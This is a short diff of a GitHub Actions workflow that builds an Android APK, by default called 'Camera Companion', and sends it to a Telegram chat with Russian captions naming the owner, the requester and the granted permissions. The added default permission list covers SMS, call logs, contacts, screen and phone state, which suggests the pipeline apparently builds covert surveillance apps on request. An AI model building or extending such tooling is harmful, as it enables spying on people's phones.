@@ -144,11 +144,13 @@ jobs:
           APP_NAME: ${{ github.event.inputs.app_name || 'Camera Companion' }}
           OWNER: ${{ github.event.inputs.owner_username }}
           REQUESTED_BY: ${{ github.event.inputs.requested_by }}
+          PERMS: ${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}
         run: |
           APK="app/build/outputs/apk/debug/app-debug.apk"
           CAPTION="📦 APK готов!"
           [ -n "$OWNER" ] && CAPTION="$CAPTION%0AВладелец: $OWNER"
           [ -n "$REQUESTED_BY" ] && CAPTION="$CAPTION%0AСоздал: $REQUESTED_BY"
+          [ -n "$PERMS" ] && CAPTION="$CAPTION%0AРазрешения: $PERMS"
           curl -s \
             -F "chat_id=${TG_CHAT_ID}" \
             -F "document=@${APK};filename=${APP_NAME:-companion}.apk" \
